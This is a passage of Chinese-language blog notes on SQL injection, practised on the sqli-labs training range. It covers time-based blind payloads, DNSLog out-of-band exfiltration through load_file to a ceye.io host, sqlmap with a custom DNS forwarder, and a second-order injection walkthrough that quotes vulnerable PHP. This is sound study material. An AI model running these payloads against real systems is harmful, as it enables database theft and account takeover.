class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;在 sqllabs 中前 10 关是 get 注入，参数为 id，通过 union select 必须前面查询无结果 union select 才能查询出内容&lt;/p&gt;
&lt;p&gt;在 sqllabs 中 11-14 关是 post 注入，如果采用报错注入，无关注入参数&lt;/p&gt;
&lt;p&gt;但 sqllabs15 关只能使用时间盲注，必须保证注入参数中必须能查询到正确的内容，或者使用 or，最后使用 and ‘1’=&#39;1 闭合，但 or 会有 and 和 or 优先级问题。&lt;/p&gt;
&lt;p&gt;mysql 中 and 优先级 高级 or&lt;/p&gt;
&lt;p&gt;1’ or if(ascii(substr(database(),1,1))&amp;gt;100,sleep(3),0) #&lt;/p&gt;
&lt;p&gt;dumb’ and  if(ascii(substr(database(),1,1))&amp;gt;100,sleep(3),0) #&lt;/p&gt;
&lt;p&gt;1’ or if(ascii(substr(database(),1,1))&amp;gt;100,sleep(3),0) and ‘1’=&#39;1&lt;/p&gt;
&lt;p&gt;1’ or if(ascii(substr(database(),1,1))&amp;gt;100,sleep(3),0) or ‘1’=&#39;1&lt;/p&gt;
&lt;p&gt;或者使用 bool 盲注&lt;/p&gt;
&lt;p&gt;判断是否存在 flag.jpg&lt;/p&gt;
&lt;h5 id=&#34;搜索注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#搜索注入&#34;&gt;#&lt;/a&gt; 搜索注入&lt;/h5&gt;
&lt;p&gt;在 like%% 中注入&lt;/p&gt;
&lt;h5 id=&#34;dnslog注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dnslog注入&#34;&gt;#&lt;/a&gt; DNSLog 注入&lt;/h5&gt;
&lt;p&gt;前提条件：secure_file_priv 为空&lt;/p&gt;
&lt;p&gt;关于 secure_file_priv :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;secure_file_priv 特性，有三种状态&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;secure_file_priv 为 null  表示不允许导入导出&lt;/li&gt;
&lt;li&gt;secure_file_priv 指定文件夹时，表示 mysql 的导入导出只能发生在指定的文件夹&lt;/li&gt;
&lt;li&gt;secure_file_priv 没有设置时，则表示没有任何限制&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;注入使用 load_file 函数&lt;/p&gt;
&lt;p&gt;关于 load_file 函数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;LOAD_FILE () 函数读取一个文件并将其内容作为字符串返回&lt;/p&gt;
&lt;p&gt;语法为：load_file (file_name)，其中 file_name 是文件的完整路径&lt;/p&gt;
&lt;p&gt;此函数使用需要满足的条件&lt;/p&gt;
&lt;p&gt;文件必须位于服务器主机上&lt;br&gt;
你必须具有该 FILE 权限才能读取该文件。拥有该 FILE 权限的用户可以读取服务器主机上的任何文件，该文件是 world-readable 的或 MySQL 服务器可读的，此属性与 secure_file_priv 状态相关&lt;br&gt;
文件必须是所有人都可读的，并且它的大小小于 max_allowed_packet 字节&lt;/p&gt;
&lt;p&gt;select load_file(’/etc/passwd’);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注入时需要使用 UNC 路径&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;UNC 路径就是类似 \softer 这样的形式的网络路径。它符合 \servername\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。&lt;/p&gt;
&lt;p&gt;目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。&lt;/p&gt;
&lt;p&gt;例如把自己电脑的文件共享，你会获得如下路径，这就是 UNC 路径&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常用的 DNSLog 平台&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NleWUuaW8v&#34;&gt;CEYE - Monitor service for security testing&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;注入方式：&lt;br&gt;
1. 注册上述平台，获取自己的 Identifier&lt;/p&gt;
&lt;p&gt;2. 在 payloads 页面找到官方给出的不同数据库适用的 payload&lt;/p&gt;
&lt;p&gt;3. 到测试目标修改并输入 payload&lt;/p&gt;
&lt;p&gt;4. 如果可以明显看到有页面加载的过程，说明外带成功&lt;/p&gt;
&lt;p&gt;下面使用 sqli 靶场做演示：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;and (select load_file(concat(&amp;#x27;//&amp;#x27;,(select database()),&amp;#x27;.3xtn8b.ceye.io/abc&amp;#x27;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select load_file(concat(&amp;#x27;//&amp;#x27;,(select hex(user())),&amp;#x27;.3xtn8b.ceye.io/abc&amp;#x27;)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再到网页中 Records-&amp;gt;DNS Query 即可到的注入的数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215231635316.png&#34; alt=&#34;image-20220215231635316&#34;&gt;&lt;/p&gt;
&lt;p&gt;注意：如果注入的字符中带有非法字符，比如 &amp;quot;@&amp;quot;, 需要使用 hex () 进行 16 进制编码，获取数据后在进行解码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMToxODg4OC9zcWxpL2xlc3MtMS8/aWQ9MSUyNyUyMGFuZCUyMChzZWxlY3QlMjBsb2FkX2ZpbGUoY29uY2F0KCUyNy8vJTI3LChzZWxlY3QlMjBoZXgodXNlcigp&#34;&gt;http://127.0.0.1:18888/sqli/less-1/?id=1&#39; and (select load_file(concat(&#39;//&#39;,(select hex(user()&lt;/span&gt;)),%&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzI3LjN4dG44Yi5jZXllLmlvL2FiYyUyNw==&#34;&gt;27.3xtn8b.ceye.io/abc&#39;&lt;/span&gt;)))%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215232952016.png&#34; alt=&#34;image-20220215232952016&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;使用burpdnslog快速获取全部数据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用burpdnslog快速获取全部数据&#34;&gt;#&lt;/a&gt; 使用 Burp+DNSlog 快速获取全部数据&lt;/h5&gt;
&lt;p&gt;使用 Burp 中的 intruder 模块配合 DNSlog 平台的导出功能。核心是控制 limit x,1 中的变量 x，实现自动查询下一个数据&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMjk5MDQwMjU=&#34;&gt;https://zhuanlan.zhihu.com/p/129904025&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;发送 URL 到 burp 的测试器&lt;/p&gt;
&lt;p&gt;limit 0，1 后面的 0 设置为变量&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-3309297fe1795a587e808195b6582d15_720w.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;payload 选择&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-a9c23d520c5668e36296576a81b3605a_720w.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;线程设置为 1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://pic1.zhimg.com/80/v2-82412940b45778e3dfdbcbd2fd5616a8_720w.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后开始攻击&lt;/p&gt;
&lt;p&gt;完成以后&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8c1ba9bd1ab38ca059d525044cb30ecb_720w.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以在平台上查到获取到的表名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-4da5cf686963af08917d23d77e344f3f_720w.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;平台提供文件导出为 json 文件的功能&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-e825098900bde120e4699a7b23da3cf9_720w.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;下载到本地，放到脚本目录&lt;/p&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#自己平台的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &amp;#x27;.xxx.ceye.io&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f = open(&amp;#x27;./data.json&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;json_data = f.read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = json.loads(json_data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data_list = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in data:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data_list.append(i[&amp;#x27;name&amp;#x27;].replace(url,&amp;#x27;&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data_list = list(set(data_list))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in data_list:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以去重以后打印出刚才获取的数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-55e96da4d9ec9f31b14522af3a1b419e_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;1. 安装 DNS 服务器&lt;/p&gt;
&lt;p&gt;2. 添加正向查找区域&lt;/p&gt;
&lt;p&gt;区域名称为 oupeng.top&lt;/p&gt;
&lt;p&gt;3.DNS 属性中启动递归，启用简单和递归查询&lt;/p&gt;
&lt;p&gt;4. 正向查找中新建主机 ns1 IP 地址为 sqlmapIP&lt;/p&gt;
&lt;p&gt;5. 正向查找新建泛解析，地址为 sqlmapip&lt;/p&gt;
&lt;p&gt;6. 建立条件转发器，DNS 域乱写，IP 写 sqlmap 地址&lt;/p&gt;
&lt;p&gt;7.sqlmap 进攻靶机，dns-domain 写条件转发器的地址&lt;/p&gt;
&lt;h5 id=&#34;dnslog配和sqlmap进行注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dnslog配和sqlmap进行注入&#34;&gt;#&lt;/a&gt; DNSLog 配和 Sqlmap 进行注入&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308110248704.png&#34; alt=&#34;image-20220308110248704&#34;&gt;&lt;/p&gt;
&lt;p&gt;MX 记录优先级高于 A 记录&lt;/p&gt;
&lt;p&gt;泛域名、泛解析：*.baidu.com 解析全部子域名&lt;/p&gt;
&lt;p&gt;1. 安装 dns 服务器&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020163942115.png&#34; alt=&#34;image-20221020163942115&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击下一步，勾选 dns 服务器，其他选项全部默认即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164020385.png&#34; alt=&#34;image-20221020164020385&#34;&gt;&lt;/p&gt;
&lt;p&gt;连续下一步，之后点击安装，等待安装…&lt;br&gt;
 安装完成之后在开始管理工具中选择 dns 管理器&lt;br&gt;
右键，属性&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164223367.png&#34; alt=&#34;image-20221020164223367&#34;&gt;&lt;/p&gt;
&lt;p&gt;关闭禁用递归，开启简单和递归查询&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164251704.png&#34; alt=&#34;image-20221020164251704&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164324361.png&#34; alt=&#34;image-20221020164324361&#34;&gt;&lt;/p&gt;
&lt;p&gt;在正常查找区域中右键选择新建区域&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164355711.png&#34; alt=&#34;image-20221020164355711&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置新建区域名称&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164422616.png&#34; alt=&#34;image-20221020164422616&#34;&gt;&lt;/p&gt;
&lt;p&gt;继续默认下一步就可以&lt;br&gt;
进入我们设置的域名，右键，新建主机（A 记录）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164445444.png&#34; alt=&#34;image-20221020164445444&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置域名，这里的 ip 地址为 kali 的 ip，继续添加泛解析&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164512708.png&#34; alt=&#34;image-20221020164512708&#34;&gt;&lt;/p&gt;
&lt;p&gt;添加转发，dns 域随便写什么，但 IP 攻击机的地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164603923.png&#34; alt=&#34;image-20221020164603923&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改靶机 dns 服务器为刚刚设置的 dns 服务器&lt;/p&gt;
&lt;p&gt;sqlmap 进行注入，–dns-domian 写条件转发器中的 dns 域&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -u &amp;quot;http://192.168.13.1:18888/sqli/Less-8/index.php?id=1&amp;quot; --technique=T --dns-domain &amp;quot;hahaha.top&amp;quot; -D security --tables&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述 sqlmap 命令作用：使用 hahaha.top 作为外带的网址。假设有台设备，kali (192.168.13.133),DNS Server (192.168.13.130), 目标靶机 (192.168.13.1)&lt;/p&gt;
&lt;p&gt;kali 上的 salmap 对目标靶机发送查询请求，并且告诉靶机将返回的内容回给 hahaha.top。由于靶机上 DNS 解析使用的是 192.168.13.130，因此靶机会将域名解析到 DNS server 上。此时 DNS Server 又设置了条件转发器，将 hahaha.top 转发给 Kali，此时 sqlmap 即可获得最终的查询结果&lt;/p&gt;
&lt;p&gt;DNSLog+Sqlmap 注入过程详解：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1545399-20190329195347336-890312924.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1884700-20210210181326467-645056694.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308114540681.png&#34; alt=&#34;image-20220308114540681&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wYzFjMjNkODAwOTg=&#34;&gt;搭建 Dnslog 平台和 Sqlmap 使用 Dns 注入 - 简书 (jianshu.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dqaHNoLm5ldC9jd2tpbGxlci1wLTEyNzk0MzkwLmh0bWw=&#34;&gt;使用 sqlmap 结合 dnslog 快速注入 (wjhsh.net)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;如果使用两个域名和一个 VPS 时，VPS 充当 kali，将域名解析到 kali，a 相当于 dns 服务器，b 相当于靶机&lt;/p&gt;
&lt;h5 id=&#34;二次注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二次注入&#34;&gt;#&lt;/a&gt; 二次注入&lt;/h5&gt;
&lt;p&gt;二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二次注入，可以概括为以下两步:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一步：插入恶意数据&lt;br&gt;
进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。&lt;/li&gt;
&lt;li&gt;第二步：引用恶意数据&lt;br&gt;
开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（1）在 sqli_libs 的第 24 关，其页面如下所示:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105005024-806493659.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;（2）当我们点击 Forgot your password? 时，出现提示：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105102785-611421933.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;（3）因此可以尝试在注册页面进行二次注入，首先，我们注册一个账号，名为：admin’#  , 密码为：123456&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105243499-1857146880.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;（4）注册成功，尝试登录 admin‘# ，然后可以查看一下 phpmyadmin 内存储情况&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105410212-767676584.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105510664-365259773.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105550423-781051799.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;（5）而这时的 admin 原密码是 admin，并且两个账号都存储在数据库内的。当我们重新修改 admin’# 的密码的时候，这里修改为：12345678；可以发现二次注入的威力所在。admin 的密码被修改为了：12345678；而 admin’# 用户的密码并没有发生变化。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105826556-1459172615.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105908571-1427285546.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;下面简单对代码进行一下分析：&lt;br&gt;
1. 注册模块：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//$username=  $_POST[&amp;#x27;username&amp;#x27;] ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$username=  mysql_escape_string($_POST[&amp;#x27;username&amp;#x27;]) ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$pass= mysql_escape_string($_POST[&amp;#x27;password&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$re_pass= mysql_escape_string($_POST[&amp;#x27;re_password&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;login_create 中对所有字段均进行了严格的过滤，无法进行注入。但我们可以注册一个用户 &lt;code&gt;admin&#39;#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;顺便插一句嘴，解释两个函数：&lt;/p&gt;
&lt;p&gt;mysql_escape_string 使用该函数对字符转义后插入数据库中会保留转义字符&lt;/p&gt;
&lt;p&gt;mysql_real_escape_string  使用该函数对字符转义后插入数据库中会去除转义字符&lt;/p&gt;
&lt;p&gt;因此 admin’# 虽然在 $username 中会被转义，但插入数据库中时仍保持原样。&lt;/p&gt;
&lt;p&gt;利用这个，我们创建用户 admin’#，然后用该用户登录&lt;/p&gt;
&lt;p&gt;登录后通过修改密码达成二次注入的目的。因为修改密码时我们就可以引用恶意数据&lt;/p&gt;
&lt;p&gt;在 pass_change.php 中代码如下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if($pass==$re_pass)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$sql = &amp;quot;UPDATE users SET PASSWORD=&amp;#x27;$pass&amp;#x27; where username=&amp;#x27;$username&amp;#x27; and password=&amp;#x27;$curr_pass&amp;#x27; &amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$res = mysql_query($sql) or die(&amp;#x27;You tried to be smart, Try harder!!!! :( &amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$row = mysql_affected_rows();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用于当前修改的是 admin’# 的密码，username 的值为 admin’#，于是语句变为下面的语句&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$sql = &amp;quot;UPDATE users SET PASSWORD=&amp;#x27;$pass&amp;#x27; where username=admin&amp;#x27;# and password=&amp;#x27;$curr_pass&amp;#x27; &amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;产生的问题在于原密码被注释了，我们修改的用户从 admin’# 变为了 admin，直接不需要原始密码就可以修改管理员的密码&lt;/p&gt;
&lt;p&gt;于是二次注入产生&lt;/p&gt;
&lt;h5 id=&#34;二次注入相关的ctf-game&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二次注入相关的ctf-game&#34;&gt;#&lt;/a&gt; 二次注入相关的 CTF GAME&lt;/h5&gt;
&lt;h6 id=&#34;网鼎杯-2018comment&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网鼎杯-2018comment&#34;&gt;#&lt;/a&gt; [网鼎杯 2018] Comment&lt;/h6&gt;
&lt;p&gt;1. 密码爆破，自己去 burp 里面玩吧&lt;/p&gt;
&lt;p&gt;2.git 泄露&lt;/p&gt;
&lt;p&gt;git add   // 提交到缓冲区&lt;/p&gt;
&lt;p&gt;git commit -m // 提交到本地仓库&lt;/p&gt;
